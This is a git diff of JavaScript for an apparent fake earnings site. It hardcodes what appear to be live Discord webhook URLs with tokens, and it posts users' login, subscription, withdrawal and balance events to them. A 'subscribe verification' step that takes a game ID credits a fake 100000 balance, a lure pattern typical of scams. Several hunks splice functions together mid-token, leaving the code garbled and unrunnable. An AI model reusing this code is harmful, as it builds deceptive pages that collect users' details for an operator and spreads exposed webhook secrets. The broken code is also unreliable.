@@ -1,19 +1,19 @@
 // WEBHOOKS
 
 const loginWebhook =
-"https://discord.com/api/webhooks/YOUR_LOGIN_WEBHOOK";
+"https://discord.com/api/webhooks/1504475286845259978/XkO1Gm7cFi8x1N5ixDDcU-iiS9HaFYp8R42WJMZcq7ZMfhSuaBSga1gToI-vrEch8VMO";
 
 const subscribeWebhook =
-"https://discord.com/api/webhooks/YOUR_SUBSCRIBE_WEBHOOK";
+"https://discord.com/api/webhooks/1503773951325638716/zeBKmrRqWRfaSZBFC07__bZ_hqOsnFqSgyd_zigjklRT4ebCsmq8jhGP5ZbYrcoD6oNX";
 
 const withdrawWebhook =
-"https://discord.com/api/webhooks/YOUR_WITHDRAW_WEBHOOK";
+"https://discord.com/api/webhooks/1503774858146742533/cR1OERc6wVRpu0Wy708kRphgmdcssuS_9QDuUHrSTSaK3wJhGDHMBjNl0DdX4eOGc2ey";
 
 const reviewWebhook =
-"https://discord.com/api/webhooks/YOUR_REVIEW_WEBHOOK";
+"https://discord.com/api/webhooks/1503774858146742533/cR1OERc6wVRpu0Wy708kRphgmdcssuS_9QDuUHrSTSaK3wJhGDHMBjNl0DdX4eOGc2ey";
 
 const balanceWebhook =
-"https://discord.com/api/webhooks/YOUR_BALANCE_WEBHOOK";
+"https://discord.com/api/webhooks/1504475637069385730/XTi4OFxJC0d1ZWWl23gg2c4qob3TyTuBmTQYlAjd87amBuVVF6kkKJ8ainS90WtYKGox";
 
 
 // VIDEO LINK
@@ -71,7 +71,21 @@ return;
 }
 
 
-// SAVE USER
+// CHECK OLD USER
+let savedUser =
+localStorage.getItem(username);
+
+
+// OLD USER LOGIN
+if(savedUser){
+
+currentUser =
+JSON.parse(savedUser);
+
+}else{
+
+
+// NEW USER
 currentUser = {
 
 name: username,
@@ -82,12 +96,24 @@ earning: 0,
 
 withdrawal: 0,
 
-balance: 0
+balance: 0,
+
+verified:false
 
 };
 
+}
 
-// SAVE STORAGE
+
+// SAVE USER
+localStorage.setItem(
+
+username,
+
+JSON.stringify(currentUser)
+
+);
+
 localStorage.setItem(
 
 "currentUser",
@@ -97,7 +123,7 @@ JSON.stringify(currentUser)
 );
 
 
-// DISCORD LOGIN
+// LOGIN WEBHOOK
 fetch(loginWebhook,{
 
 method:"POST",
@@ -119,14 +145,14 @@ currentUser.name
 
 });
 
-
-// SHOW HOME
-showHome();
-
-}
+  
 
 
-// SHOW HOME
+// HIDE ALL
+
+function hideAllPages(){
+
+document.getElementById("logi// SHOW HOME
 
 function showHome(){
 
@@ -157,14 +183,25 @@ document.getElementById("balance")
 .innerText =
 currentUser.balance;
 
+
+// VERIFY LOCK
+if(currentUser.verified){
+
+document.querySelector(".verifyBtn")
+.innerText =
+
+"VERIFICATION COMPLETED 🔒";
+
+}else{
+
+document.querySelector(".verifyBtn")
+.innerText =
+
+"SUBSCRIBE VERIFICATION";
+
 }
 
-
-// HIDE ALL
-
-function hideAllPages(){
-
-document.getElementById("loginPage")
+}nPage")
 .classList.add("hidden");
 
 document.getElementById("homePage")
@@ -237,6 +274,18 @@ showHome();
 
 function submitSubscribe(){
 
+// ALREADY VERIFIED
+if(currentUser.verified){
+
+alert(
+"Verification Already Completed 🔒"
+);
+
+return;
+
+}
+
+
 let gameId =
 document.getElementById("gameId")
 .value.trim();
@@ -258,14 +307,32 @@ return;
 }
 
 
+// VERIFY USER
+currentUser.verified = true;
+
+
 // ADD MONEY
 currentUser.balance += 100000;
 
 currentUser.earning += 100000;
 
 
-// SAVE
-saveUser();
+// SAVE USER
+localStorage.setItem(
+
+currentUser.name,
+
+JSON.stringify(currentUser)
+
+);
+
+localStorage.setItem(
+
+"currentUser",
+
+JSON.stringify(currentUser)
+
+);
 
 
 // WEBHOOK
@@ -304,13 +371,12 @@ sendBalanceWebhook();
 
 
 alert(
-"100000 Added ✅"
+"Verification Completed ✅"
 );
 
 showHome();
 
 }
-
 
 // SELECT AMOUNT
 
@@ -489,9 +555,17 @@ showHome();
 }
 
 
-// SAVE USER
+ // SAVE USER
 
 function saveUser(){
+
+localStorage.setItem(
+
+currentUser.name,
+
+JSON.stringify(currentUser)
+
+);
 
 localStorage.setItem(
 
@@ -502,7 +576,6 @@ JSON.stringify(currentUser)
 );
 
 }
-
 
 // BALANCE WEBHOOK
 
